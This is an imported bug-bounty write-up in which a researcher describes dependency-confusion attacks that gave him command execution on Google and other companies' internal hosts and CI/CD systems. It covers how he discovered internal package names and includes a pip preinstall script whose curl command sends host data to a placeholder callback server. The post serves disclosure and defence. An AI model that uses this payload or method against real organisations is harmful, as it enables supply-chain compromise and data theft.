---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-25_how-i-hacked-into-googles-internal-corporate-assets.md
original_filename: 2024-02-25_how-i-hacked-into-googles-internal-corporate-assets.md
title: How I hacked into Google’s internal corporate assets
category: documents
detected_topics:
- supply-chain
- command-injection
- sso
- api-security
tags:
- imported
- documents
- supply-chain
- command-injection
- sso
- api-security
language: en
raw_sha256: 8f0afba35ac03b3b32cb26abbee7854c1184c0f15cfabb830fc6e0d8ccfd8dbf
text_sha256: 6a35666f63fda687e0270cf63548b9120766756c812b2c18c8d4b704f944c578
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: false
---

# How I hacked into Google’s internal corporate assets

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-25_how-i-hacked-into-googles-internal-corporate-assets.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, sso, api-security
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: False
- Raw SHA256: `8f0afba35ac03b3b32cb26abbee7854c1184c0f15cfabb830fc6e0d8ccfd8dbf`
- Text SHA256: `6a35666f63fda687e0270cf63548b9120766756c812b2c18c8d4b704f944c578`


## Content

---
title: "How I hacked into Google’s internal corporate assets"
page_title: "How I hacked into Google’s internal corporate assets – Observations in Security"
url: "https://observationsinsecurity.com/2024/04/25/how-i-hacked-into-googles-internal-corporate-assets/"
final_url: "https://observationsinsecurity.com/2024/04/25/how-i-hacked-into-googles-internal-corporate-assets/"
authors: ["Michael Hyndman"]
programs: ["Google"]
bugs: ["Dependency confusion", "RCE", "Supply chain attack"]
publication_date: "2024-02-25"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 405
---

# How I hacked into Google’s internal corporate assets

![](https://observationsinsecurity.com/wp-content/uploads/2024/04/pexels-photo-13628541.jpeg?w=1568)

## It’s raining command injections! 

Every now and then, I take some time to work on bug bounty projects to explore threat vectors into real world targets like Google, Tesla and many others. Doing so helps me stay aware of the fast-changing technical landscape, which is crucial for my role as a technology CISO. Plus, it’s enjoyable and provides extra income. 

On my most recent venture, I focused on open-source and supply chain attacks. Over the period of a week I discovered multiple vulnerabilities, and gained control of (read: “command injection on”) numerous in-scope bug bounty assets. Gaining command injection essentially means the ability to execute arbitrary commands in an Operating System (ie. MacOS, Linux, etc) and in my case – as root or admin. I was able to run OS commands on over a thousand assets including servers, containers, CI/CD systems & developer machines. Six of these assets were Google’s internal corporate assets, many more belonged to a self-driving car company’s build CI/CD pipeline and others I can’t share the details on. These findings were mostly critical with high impact.

Interestingly, in the case of Google, I received an honourable mention but was not awarded a bounty as the most critical asset I compromised was a developers machine. In contrast, I was awarded a bounty by another company for doing just that. 

## How?

Today, much of our software relies on “open source software libraries” to handle specific software functions. These libraries – essentially small software packages – are freely available to the public to use, support, and maintain. They play a crucial role in speeding up and simplifying software development.

Many of the applications and software we use every day as consumers (ie. banking apps, government services, social media, etc) heavily depend on these open source libraries, often referred to as “dependencies”. During software development, programming languages such as Python and Node.js fetch these dependencies to build the software. 

Developers are familiar with commands like:

  * npm install <packagename>
  * pip install <packagename>

These dependencies can be sourced internally, from within the organization’s artifact registry, or externally, from a public register. However, a significant issue arises when an external attacker identifies and registers a public package that an organization is exclusively using internally.

In such cases, programming languages like Node.js and Python are programmed to automatically retrieve a public version of the package if no local version is available – or if the public version is higher. If the public version is malicious – this can have immediately severe consequences for the software that is being targeted, any sensitive data associated with the software and for the customers who use the software. What’s more, these types of attacks are really hard to detect when they happen. 

![](https://observationsinsecurity.com/wp-content/uploads/2024/04/image.png)

## How I discovered vulnerable packages

Despite the fact that pioneers of this bug like [Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) had mopped up Apple, Microsoft, Yelp and many other companies who were vulnerable to this attack, I donned my VC thinking and took a somewhat philosophical view that there were a number of fundamentals at play that when combined, would likely result in me still being able to find and exploit these bugs and thereby secure some return on investment. These fundamentals were;

  1. It is likely that many large organizations are vulnerable to dependency confusion in some way and I still believe this to be true even after my exploits – in fact, more-so now. Although I don’t have evidence, I’ve had enough anecdotal conversations to get the impression that not many tech companies are taking an organized and risk based approach to uplifting the security of their CI/CD pipelines. This is not something that security attestations like SOC2 or ISO27001 cover but it is a critical area of risk for software development.
  2. The perceived typical approaches to solving this problem can involve needlessly imposing cost on developer time or on the actual security budget and this has a deterrent effect on the ability for an engineering org to quickly effect remedial change in this space. In other words, it can sometimes be perceived as “hard” or “slow” to fix, which is not entirely true. Fixing this can be as simple as registering legitimate public packages under the same name, that contain no code, but are designed to secure the namespace so it can’t be taken by others. As an aside, I went to a security conference recently, where a security vendor was selling a tool to solve this exact problem. You don’t need to buy a tool to solve this problem and it reinforced to me that this issue is not well understood by security teams – and that is the second fundamental reason why I figured this particular endeavor worthy of some time and effort. 

### Some things I observed while doing discovery:

When orgs build their own internal dependencies, these are typically named something that aligns to an internal service or function that is consumed by multiple services or applications. For example, a company might have an internal dependency called “companyname-regex”. This is significant because the names of these internal dependencies can align to names of publicly available names; names that are contained in functions in externally accessible code or even the names of externally accessible apis or services. Extending on this hypothesis, developers might use names that are associated with core products or features. Because of this, a degree of discovering these in public javascript and/or brute forcing them is possible

For me this is the scariest part because of how significant the potential is to target organizations and scale this attack up. I saw evidence from research from companies like checkmarx who had identified actors (unconfirmed if they were malicious or not) who scaled up attacks (creating hundreds of these dependencies) targeting specific companies through what seemed to be similar bruteforcing activity (guessing the names of internal services, utilities, etc).

So I set out to find some vulnerable dependencies. I did this via a number of methods:

  * Scanned hundreds of public github repositories to identify dependencies that looked like internal dependencies. 
  * Spidered and scanned javascript on websites
  * Scanned public web server directories to reveal endpoints like /package.json. 
  * Downloaded old/archived website javascript and scanned that to find references to old dependencies, old javascript functions that have since been removed in the last 5 years but could be used elsewhere. 

### Scanning tools that I used included:

  * [Confused](https://github.com/visma-prodsec/confused) – this was used to check whether the dependency was in a public register or not. 
  * Other than this, I wrote all of my other tools and used GenerativeAI to speed the process of script writing up. The code it produced was impressive allowed me to conduct a substantial amount of research at a far greater pace than what I ordinarily would have been able to. 

### Scanning techniques included:

  * Searching for dependency files in places like github (ie. package.json, dependencies.txt)
  * Searching for functions within public code on websites that refer to possible dependency names. This included: 
  * import(‘dependency_path’)
  * require(‘dependency_path’)
  * define(‘module’)
  * “exports=JSON.parse”
  * References to ‘node_module’ where dependency files are usually saved
  * Using regex to search through javascript looking for potential dependency names 
  * (example: grep -Por ‘”.*”:”\^[0-9]+\\.[0-9]+\\.[0-9]+”‘ | tr ‘,’ ‘\n’ | awk ‘/”.*”:”\^[0-9]+\\.[0-9]+\\.[0-9]+”/ {print}’ | sort -u)

## How I exploited dependency confusion

Once I had identified a number of externally accessible <potential or confirmed> dependency names, getting a command injection on a server to prove the concept was conceptually straightforward but practically difficult. I won’t explain this much here – other resources exist out there that explain this process in more detail. 

However, in essence, using a curl command in a dependency install script like below – once installed on a target host – grabs some basic information about the host and sends it to a server. 

Bear in mind that for some programs, this is actually out of scope (ie Yelp), but for the vast majority of programs where I’ve seen this, they expect some form of command injection as proof – ‘or it never happened’. Always check the program scope before proceeding. 

### Example PIP Dependency preinstall script. 

> import subprocess
> 
> def pre_install():
> 
> curl_command = ‘curl -X -H “Hostname: $(hostname)” -H “Username: $(whoami)” -H “Directory name: $(pwd)” <https://my-call-back-server>
> 
> subprocess.run(curl_command, shell=True)
> 
> if __name__ == “__main__”:
> 
> pre_install()

### Some things I observed while doing exploitation:

  * Organizations impacted the most were those running continuous delivery and deployment. It didn’t impact software that had a slower development cycle, this is because with continuous delivery and deployment, artifacts are called regularly and automatically and so risk of compromise within a given timeframe is much more likely. Organizations impacted by this bug are typically going to be medium to larger software companies with larger scalable software architectures like Kubernetes. 
  * This also impacts developers. I’d often have developers installing my packages on their local development machines due to a general lack of awareness or vigilance around open source risks. 
  * These packages are not just running software around the world, they are the hidden bedrock of our digital economy. Literally the basis upon which commerce happens around the globe – indeed the provision of modern critical services such as healthcare – many of these things are reliant on open source software in some way. All it takes for a financially motivated criminal or some form of espionage is to drop a well targeted package into a public register and BOOM! a malicious actor could gain control of any number of servers across any number of larger organizations. Because of this, I’d love to see these registers work more closely with the bug bounty community to test evasion & detection techniques for malicious packages. 

### Share this:

  * [ Share on X (Opens in new window) X ](https://observationsinsecurity.com/2024/04/25/how-i-hacked-into-googles-internal-corporate-assets/?share=twitter)
  * [ Share on LinkedIn (Opens in new window) LinkedIn ](https://observationsinsecurity.com/2024/04/25/how-i-hacked-into-googles-internal-corporate-assets/?share=linkedin)
  * [ Share on WhatsApp (Opens in new window) WhatsApp ](https://observationsinsecurity.com/2024/04/25/how-i-hacked-into-googles-internal-corporate-assets/?share=jetpack-whatsapp)
  * 

Like Loading...

### _Related_
